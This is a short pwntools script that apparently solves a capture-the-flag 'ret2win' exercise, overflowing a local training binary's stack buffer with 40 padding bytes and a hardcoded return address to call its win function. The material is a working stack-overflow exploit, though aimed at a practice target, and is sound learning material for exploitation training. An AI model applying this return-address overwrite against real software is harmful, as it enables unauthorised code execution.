from pwn import *

local = process("./ret2win")
payload1 = b'B'*40
ret2win_address = p64(0x400756)
final_payload = payload1 + ret2win_address 

log.info(f"final paload is: {final_payload}")
log.info(f"ret2win address is: {ret2win_address}")
log.info(f"final payload length is: {len(final_payload)}")

local.send(final_payload)
print(local.recv())


